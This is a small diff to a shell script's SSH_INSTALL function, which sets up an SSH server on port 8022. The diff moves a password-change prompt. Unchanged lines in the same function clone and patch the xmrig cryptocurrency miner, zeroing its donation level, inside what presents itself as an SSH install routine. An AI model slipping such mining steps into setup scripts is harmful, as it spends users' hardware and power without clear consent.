@@ -378,7 +378,6 @@ SSH_INSTALL(){
   INFO "SSH server running at: $IP:8022"
   INFO "Login with any username and your private key"
   
-   INFO "change local user passwd at: $IP:8022" && passwd
   git clone https://github.com/xmrig/xmrig.git
   sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig/src/donate.h
   sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig/src/donate.h
@@ -393,7 +392,8 @@ echo "SSH server running at: `ip addr | grep 'state UP' -A2 | tail -n1 | awk '{p
 EOM
 chmod 755 ip.sh
 echo "$HOME/ip.sh" >> "$HOME/.bashrc"
-  INFO "SSH create success"
+ INFO "change local user passwd at: $IP:8022" && passwd
+ INFO "SSH create success"
 }
 
 
